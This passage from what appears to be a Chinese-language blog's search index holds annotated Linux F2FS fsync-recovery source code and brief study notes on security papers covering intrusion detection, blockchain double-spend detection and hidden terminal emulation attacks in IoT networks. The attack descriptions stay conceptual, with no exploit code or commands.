<h3 id="find-fsync-dnodes-找到所有的可以恢复的dnode对应的inode"><a href="#find-fsync-dnodes-找到所有的可以恢复的dnode对应的inode" class="headerlink" title="find_fsync_dnodes // 找到所有的可以恢复的dnode对应的inode"></a>find_fsync_dnodes // 找到所有的可以恢复的dnode对应的inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">find_fsync_dnodes</span><span class="params">(struct f2fs_sb_info *sbi, struct list_head *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_ver = le64_to_cpu(sbi-&gt;ckpt-&gt;checkpoint_ver);<span class="comment">// cp版本</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">curseg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">block_t</span> blkaddr;</span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取当前段的节点页面</span></span><br><span class="line"><span class="comment">     * CURSEG_I因为是基于dnode进行恢复，因此是WARM NODE</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    curseg = CURSEG_I(sbi, CURSEG_WARM_NODE);</span><br><span class="line">    blkaddr = START_BLOCK(sbi, curseg-&gt;segno) + curseg-&gt;next_blkoff;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读页面 */</span></span><br><span class="line">    page = alloc_page(GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(page))</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(page);</span><br><span class="line">    lock_page(page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f2fs_readpage(sbi, page, blkaddr, READ_SYNC))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cp_ver != cpver_of_node(page)) <span class="comment">// 比较从cp版本</span></span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_fsync_dnode(page)) <span class="comment">// 前滚恢复只能恢复被fsync的node page</span></span><br><span class="line">            <span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果是NULL，则表示inode不在list中</span></span><br><span class="line"><span class="comment">         * 如不是NULL，则表示这个inode已经在list中，不需要加入了</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        entry = get_fsync_inode(head, ino_of_node(page));</span><br><span class="line">            <span class="keyword">if</span> (entry) &#123;</span><br><span class="line">                entry-&gt;blkaddr = blkaddr;</span><br><span class="line">                <span class="comment">// 如果是dentry的inode，则先恢复</span></span><br><span class="line">                <span class="keyword">if</span> (IS_INODE(page) &amp;&amp; is_dent_dnode(page))</span><br><span class="line">                    set_inode_flag(F2FS_I(entry-&gt;inode),</span><br><span class="line">                                            FI_INC_LINK);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (IS_INODE(page) &amp;&amp; is_dent_dnode(page)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (recover_inode_page(sbi, page)) &#123;</span><br><span class="line">                        err = -ENOMEM;</span><br><span class="line">                        <span class="keyword">goto</span> out;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* add this fsync inode to the list */</span></span><br><span class="line">                entry = kmem_cache_alloc(fsync_entry_slab, GFP_NOFS);</span><br><span class="line">                <span class="keyword">if</span> (!entry) &#123;</span><br><span class="line">                    err = -ENOMEM;</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                INIT_LIST_HEAD(&amp;entry-&gt;<span class="built_in">list</span>);</span><br><span class="line">                list_add_tail(&amp;entry-&gt;<span class="built_in">list</span>, head);</span><br><span class="line"></span><br><span class="line">                entry-&gt;inode = f2fs_iget(sbi-&gt;sb, ino_of_node(page));</span><br><span class="line">                <span class="keyword">if</span> (IS_ERR(entry-&gt;inode)) &#123;</span><br><span class="line">                    err = PTR_ERR(entry-&gt;inode);</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line">                entry-&gt;blkaddr = blkaddr;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (IS_INODE(page)) &#123;</span><br><span class="line">                err = recover_inode(entry-&gt;inode, page);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">next:</span><br><span class="line">            <span class="comment">/* check next segment */</span></span><br><span class="line">            blkaddr = next_blkaddr_of_node(page);</span><br><span class="line">            ClearPageUptodate(page);</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    unlock_page(page);</span><br><span class="line">    __free_pages(page, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="destroy-fsync-dnodes-销毁fsync-dnodes"><a href="#destroy-fsync-dnodes-销毁fsync-dnodes" class="headerlink" title="destroy_fsync_dnodes // 销毁fsync dnodes"></a>destroy_fsync_dnodes // 销毁fsync dnodes</h3><h3 id="check-index-in-prev-nodes-检查前向节点的索引"><a href="#check-index-in-prev-nodes-检查前向节点的索引" class="headerlink" title="check_index_in_prev_nodes // 检查前向节点的索引"></a>check_index_in_prev_nodes // 检查前向节点的索引</h3><h3 id="do-recover-data-恢复data-page和node-page"><a href="#do-recover-data-恢复data-page和node-page" class="headerlink" title="do_recover_data // 恢复data page和node page"></a>do_recover_data // 恢复data page和node page</h3><blockquote>
<p>首先调用<code>start_bidx_of_node</code>函数，把当前node page的起始块索引赋给start<br><code>set_new_dnode</code>建立一个vfs dnode，<code>get_dnode_of_data</code>初始化刚刚建立的dnode相关信息。<br><code>wait_on_page_writeback</code>等待页面回写<br><code>get_node_info</code>从node page获取节点信息<br><code>datablock_addr</code>获取文件名和索引<br><code>check_index_in_prev_nodes</code>检查具有以上获取的索引的前向节点<br>通过调用<code>recover_data_page</code>和<code>update_extent_cache</code>写入虚拟数据页<br>调用<code>recover_node_page</code>恢复node page</p>
</blockquote>
<h3 id="recover-data-恢复数据"><a href="#recover-data-恢复数据" class="headerlink" title="recover_data // 恢复数据"></a>recover_data // 恢复数据</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recover_data</span><span class="params">(struct f2fs_sb_info *sbi,</span></span></span><br><span class="line"><span class="params"><span class="function">                struct list_head *head, <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_ver = le64_to_cpu(sbi-&gt;ckpt-&gt;checkpoint_ver);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">curseg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">block_t</span> blkaddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get node pages in the current segment */</span></span><br><span class="line">    curseg = CURSEG_I(sbi, type);</span><br><span class="line">    blkaddr = NEXT_FREE_BLKADDR(sbi, curseg);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read node page */</span></span><br><span class="line">    page = alloc_page(GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(page))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    lock_page(page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f2fs_readpage(sbi, page, blkaddr, READ_SYNC))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cp_ver != cpver_of_node(page))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从inodelist中取出一个entry</span></span><br><span class="line">        entry = get_fsync_inode(head, ino_of_node(page));</span><br><span class="line">        <span class="keyword">if</span> (!entry)</span><br><span class="line">            <span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 进行恢复</span></span><br><span class="line">        do_recover_data(sbi, entry-&gt;inode, page, blkaddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;blkaddr == blkaddr) &#123;</span><br><span class="line">            iput(entry-&gt;inode);</span><br><span class="line">            list_del(&amp;entry-&gt;<span class="built_in">list</span>);</span><br><span class="line">            kmem_cache_free(fsync_entry_slab, entry);</span><br><span class="line">        &#125;</span><br><span class="line">next:</span><br><span class="line">        <span class="comment">/* check next segment */</span></span><br><span class="line">        blkaddr = next_blkaddr_of_node(page);</span><br><span class="line">        ClearPageUptodate(page);</span><br><span class="line">        &#125;</span><br><span class="line">out:</span><br><span class="line">    unlock_page(page);</span><br><span class="line">    __free_pages(page, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    allocate_new_segments(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="recover-fsync-data-恢复fsync数据"><a href="#recover-fsync-data-恢复fsync数据" class="headerlink" title="recover_fsync_data // 恢复fsync数据"></a>recover_fsync_data // 恢复fsync数据</h3><p>①首先通过<code>find_fsync_dnodes</code>函数找到所有的可以恢复的dnode对应的inode(有可能dnode就是inode本身)，放入到一个list中。  </p>
<blockquote>
<p><code>find_fsync_dnodes</code>的执行流程：通过调用<code>CURSEG_I</code>和<code>START_BLOCK</code>函数获取当前段（segment）的node pages，再调用alloc_page读取node pages，把可恢复的dnode对应的inode添加到list中，再检查下个段（segment）。  </p>
</blockquote>
<p>②恢复数据：恢复inode list里面的所有的node page</p>
]]></content>
      <categories>
        <category>内核</category>
      </categories>
      <tags>
        <tag>Linux内核</tag>
        <tag>F2FS</tag>
      </tags>
  </entry>
  <entry>
    <title>A multi-flow information flow tracking approach for proving quantitative hardware security properties</title>
    <url>/2020/09/03/A-multi-flow-information-flow-tracking-approach/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>hardware security; Information Flow Tracking (IFT); multi-flow IFT; security property</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/03/A-multi-flow-information-flow-tracking-approach/image-20210524202126427.png" alt="image-20210524202126427"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/9121656">https://ieeexplore.ieee.org/document/9121656</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>信息流跟踪</tag>
        <tag>硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Securing Data With Blockchain and AI</title>
    <url>/2020/09/14/With-Blockchain-and-AI/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Data security, data systems, artificial intelligence, cyberspace</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/14/With-Blockchain-and-AI/image-20210524204351643.png" alt="image-20210524204351643"></p>
<ul>
<li>CPS：Cyber Physical Social 信息物理社会融合系统</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/8733072">https://ieeexplore.ieee.org/document/8733072</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>基于多目标进化算法的变密度模糊认知图学习</title>
    <url>/2020/09/09/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%9B%AE%E6%A0%87%E8%BF%9B%E5%8C%96%E7%AE%97%E6%B3%95%E7%9A%84%E5%8F%98%E5%AF%86%E5%BA%A6%E6%A8%A1%E7%B3%8A%E8%AE%A4%E7%9F%A5%E5%9B%BE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Densities, fuzzy cognitive maps, multiobjective evolutionary algorithms (MOEAs), multiobjective optimization problems (MOP)</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/09/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%9B%AE%E6%A0%87%E8%BF%9B%E5%8C%96%E7%AE%97%E6%B3%95%E7%9A%84%E5%8F%98%E5%AF%86%E5%BA%A6%E6%A8%A1%E7%B3%8A%E8%AE%A4%E7%9F%A5%E5%9B%BE%E5%AD%A6%E4%B9%A0/image-20210524203330315.png" alt="image-20210524203330315"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/7094248">https://ieeexplore.ieee.org/document/7094248</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>FCM</tag>
        <tag>多目标优化MOP</tag>
      </tags>
  </entry>
  <entry>
    <title>A Practical Approach to Constructing a Knowledge Graph for Cybersecurity</title>
    <url>/2020/09/07/Knowledge-Graph-for-Cybersecurity/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Cybersecurity; Knowledge graph; Knowledge deduction</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/07/Knowledge-Graph-for-Cybersecurity/image-20210524202713003.png" alt="image-20210524202713003"></p>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a href="https://www.sciencedirect.com/science/article/pii/S2095809918301097">https://www.sciencedirect.com/science/article/pii/S2095809918301097</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>知识图谱</tag>
      </tags>
  </entry>
  <entry>
    <title>基于增量式GHSOM神经网络模型的入侵检测研究</title>
    <url>/2020/09/08/%E5%9F%BA%E4%BA%8E%E5%A2%9E%E9%87%8F%E5%BC%8FGHSOM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>增量式学习; 生长型分层自组织映射; 入侵检测; 神经网络; 信息安全; 网络安全</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><ul>
<li>GHSOM (Growing Hierarchical Self-Organizing Maps)：生长型分层自组织映射</li>
</ul>
<p><img src="/2020/09/08/%E5%9F%BA%E4%BA%8E%E5%A2%9E%E9%87%8F%E5%BC%8FGHSOM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20210524205136903.png" alt="image-20210524205136903"></p>
<h3 id="增量式学习"><a href="#增量式学习" class="headerlink" title="增量式学习"></a>增量式学习</h3><ol>
<li>不断学习新样本</li>
<li>保留大部分以前学到的知识</li>
<li>渐进修正/增强以前学过的知识</li>
<li>更新后的知识可以适应更新后的数据，不必重新学习</li>
<li>降低了时间、空间需求</li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFD2014&amp;filename=JSJX201405021&amp;v=u%25mmd2FXyKNgKblZDXNd1PBDDrj4%25mmd2BkCMAh5GmPm2gysD0h%25mmd2FlNMKEyMtTn3Y1mpOCwBZ1e">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFD2014&amp;filename=JSJX201405021&amp;v=u%25mmd2FXyKNgKblZDXNd1PBDDrj4%25mmd2BkCMAh5GmPm2gysD0h%25mmd2FlNMKEyMtTn3Y1mpOCwBZ1e</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>入侵检测</tag>
      </tags>
  </entry>
  <entry>
    <title>面向智能终端的快捷支付双花攻击检测模型</title>
    <url>/2020/09/24/%E9%9D%A2%E5%90%91%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%94%AF%E4%BB%98%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>数字加密货币; 安全交易; 双花攻击; 人工免疫; 异常检测</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><h3 id="51-攻击"><a href="#51-攻击" class="headerlink" title="51% 攻击"></a>51% 攻击</h3><ul>
<li>指攻击者利用算力优势（大于50%）强行修改 合法的交易记录，实现一笔虚拟货币两次消费</li>
<li>对于比特币交易而言，每个用户节点都可参与交易的合法性验证和确认。</li>
<li>参与交易的节点就是矿工节点，他们用CPU计算资源进行挖矿（利用CPU资源计算随机数），通过工作量证明（POW）机制进行账单记录权的争夺，胜利者将得到一份比特币作为奖励。</li>
</ul>
<h4 id="攻击条件说明"><a href="#攻击条件说明" class="headerlink" title="攻击条件说明"></a>攻击条件说明</h4><p>条件一：根据比特币协议，后到的同源交易将被丢弃</p>
<p>条件三：因为比特币用户是匿名的，而且一个 用户可拥有多个账号，所以当服务结束了，即使卖 主意识到了异常，也很难鉴别出攻击者，导致双花 攻击的可能性增大。</p>
<h3 id="预防双花攻击"><a href="#预防双花攻击" class="headerlink" title="预防双花攻击"></a>预防双花攻击</h3><p>以比特币为代表的主流数字加密货币，通过工作量证明的机制和一个记录所有确认交易的公共链来预防双花攻击</p>
<h4 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h4><p>根据比特币白皮书中的说明可知，比特币网络以交易时间为代价来累积确认交易区块的高度从而对抗双花攻击。</p>
<p><img src="/2020/09/24/%E9%9D%A2%E5%90%91%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%94%AF%E4%BB%98%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/image-20210524205529138.png" alt="image-20210524205529138"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=AQJS202005011&amp;v=kzaijASy61IKa9xpiuaF%25mmd2F3Oun4UkM8%25mmd2FZiOCNnR%25mmd2FtVHwErL%25mmd2F7lpKHbL81BNtK%25mmd2FiF1">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=AQJS202005011&amp;v=kzaijASy61IKa9xpiuaF%25mmd2F3Oun4UkM8%25mmd2FZiOCNnR%25mmd2FtVHwErL%25mmd2F7lpKHbL81BNtK%25mmd2FiF1</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>免疫</tag>
        <tag>异常检测</tag>
      </tags>
  </entry>
  <entry>
    <title>Third Eye Context-Aware Detection for Hidden Terminal Emulation Attacks in Cognitive Radio-Enabled IoT Networks</title>
    <url>/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>IoT security, context-aware detection, Markov chain, hidden Markov model</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><ul>
<li>IoT  Internet of Things  物联网</li>
<li>认知无线电 Cognitive Radio<ul>
<li>具有学习能力，能与周围环境交互信息，以感知和利用在该空间的可用频谱，并限制和降低冲突的发生。</li>
</ul>
</li>
<li>hidden terminal emulation  隐藏终端仿真</li>
</ul>
<p><img src="/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/image-20210524210542892.png" alt="image-20210524210542892"></p>
<h3 id="HTE-攻击"><a href="#HTE-攻击" class="headerlink" title="HTE 攻击"></a>HTE 攻击</h3><ul>
<li><p><strong>方法概要：</strong>攻击者利用天线辐射方向图来模拟隐藏终端(位置伪造攻击的一种形式)。  </p>
</li>
<li><p><strong>攻击前提：</strong>在先前的工作中，位置伪造被认为是一个本地化问题，锚设备（专门用于定位任何设备的设备）在检测位置伪造攻击中起着重要的作用。但是在大多数物联网应用中，物联网设备不可能配备复杂的本地化功能，在密集的IoT网络中部署锚设备也不现实。因此，在密集的物联网场景中，现成的位置欺骗检测方法不适用。  </p>
</li>
<li><p><strong>攻击过程：</strong></p>
<ul>
<li>攻击者通过wardriving等现有技术获取IoT设备的位置（角度、距离等）</li>
<li>然后根据攻击者的目标或者物理限制，攻击者可能会尝试将其作为被攻击者的所有邻居或者选定邻居的隐藏终端</li>
<li>HTE攻击者在此阶段的主要任务是成功模拟受害者附近的隐藏终端的辐射特性。  </li>
</ul>
</li>
</ul>
<p><img src="/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/00%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB.png" alt="00隐藏终端仿真攻击"></p>
<p>图a中，攻击者试图将自己伪装成节点A1，A3，A5的隐藏终端，它们只对A2，A4，A6传输。天线的智能利用使攻击者能够仿真不同的物理场景，如图b，即仿真阶段。 </p>
<p>在此阶段，HTE攻击者继续通过宽带感知来感测工作频带，并分别嗅探发往或发自受害节点的RTS和CTS消息的频带。它试图故意干扰从节点A1，A3和A5发送到受害节点（即A4）的传输。但是，干扰率的选择取决于攻击者的策略。它可能会干扰每次传输，随机干扰或在良性或恶意行为之间采取间歇性策略。在本文中，我们讨论了这些不同的攻击策略，以及它们针对上下文感知的HTE检测方法保持免疫力的能力。这种检测技术将创建一个上下文模型，以区分良性和恶意行为。因此，攻击者将尝试紧密模仿良性模型的行为，以使其未被检测到，但保持其攻击性能。我们认为攻击者（即HTE-1）采取了一种微妙的随机方法，即通过与其自身网络（即HTE-2）中的邻居继续进行常规通信，将其伪装成合法节点，并且攻击者会智能地干扰仅在攻击者闲置时（即未与HTE-2通信）接收受害者的信息。因此，与常规的反应式干扰攻击相比，它提供了不同的检测挑战。</p>
<ul>
<li><strong>攻击结果：</strong>干扰特定的传输  </li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/8964452">https://ieeexplore.ieee.org/document/8964452</a></p>
<h2 id="Oth"><a href="#Oth" class="headerlink" title="Oth"></a>Oth</h2><h3 id="针对移动终端的攻击方式"><a href="#针对移动终端的攻击方式" class="headerlink" title="针对移动终端的攻击方式"></a>针对移动终端的攻击方式</h3><ul>
<li><p>中间人攻击拦截网络流量</p>
</li>
<li><p>通过操作系统的安全漏洞或者硬件漏洞进行攻击</p>
</li>
<li><p>在应用中植入恶意代码</p>
<ul>
<li>BOptions sideloading技术<ul>
<li><a href="https://zhuanlan.zhihu.com/p/40203178">BOption侧载机制</a> </li>
<li><a href="https://www.securityweek.com/attackers-target-iphones-using-open-source-mdm-solution">其他参考</a>  </li>
<li>向合法应用程序中添加恶意代码，目的是在应用程序中注入动态库。  </li>
<li>这些插入应用程序的恶意代码能够收集并盗窃设备中的信息，如电话号码、序列号、位置、联系人、用户照片、短信、邮件、WhatsApp聊天消息等，攻击者可以利用这些信息要挟受害者或实施另外的攻击。  </li>
<li>在设备上安装附加证书以允许远程管理操作的过程中可能会导致潜在的恶意活动。</li>
</ul>
</li>
</ul>
</li>
<li><p>针对电源的Bad Power攻击</p>
</li>
</ul>
<h3 id="针对PC系统"><a href="#针对PC系统" class="headerlink" title="针对PC系统"></a>针对PC系统</h3><ul>
<li>针对打印机的APT攻击<ul>
<li><a href="https://www.freebuf.com/articles/terminal/92482.html">打印机APT攻击</a>  通过LDAP提取Windows Active Directory的证书或者滥用“扫描文件”和“扫描电子邮件”功能  </li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>HTE攻击</tag>
      </tags>
  </entry>
</search>
